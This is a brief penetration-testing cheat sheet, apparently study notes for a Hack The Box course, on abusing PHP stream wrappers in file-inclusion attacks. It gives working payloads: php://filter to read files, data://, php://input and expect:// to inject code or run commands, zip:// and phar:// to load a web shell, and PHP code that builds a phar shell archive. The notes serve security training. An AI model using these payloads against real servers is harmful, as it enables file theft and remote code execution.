# PHP Wrappers File Inclusion

[![fileinclusion](../../../../../../cybersecurity/_badges/htb/fileinclusion.svg)](https://academy.hackthebox.com/course/preview/file-inclusion)

<div class="row row-cols-lg-2"><div>

PHP Wrappers can be used to exploit a [LFI/RFI](/cybersecurity/red-team/s3.exploitation/vulns/web/inclusion.md#php-include-file-inclusion) on a server as an alternative to path traversal or similar techniques.

To **read** a file (encoded as base64):  `php://filter/read=convert.base64-encode/resource=/path/to/file`

To **inject** some code (encoded as base64): 

* `data://text/plain;base64,<base64 php code here>`
* `allow_url_include` must be enabled

To **inject** some code (as POST data), use `php://input` and:

```ps
$ curl -s -X POST --data '<?php /* code */ ?>' [...]
```
</div><div>
If expect is installed, we can use it to run commands:

* `expect://id`: run the `id` command
* `zip://./path/to/shell.zip%23shell.php&cmd=id`: if enabled, we can load a shell inside a zip <small>(.zip extension not mandatory)</small>.
* `phar://./path/to/shell.phar%2Fshell.php&cmd=id`: if enabled, we can load a shell inside a zip <small>(.phar extension not mandatory)</small>.

```php!
<?php // php --define phar.readonly=0 shell.php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.php', '<?php /*code*/ ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```
</div></div>
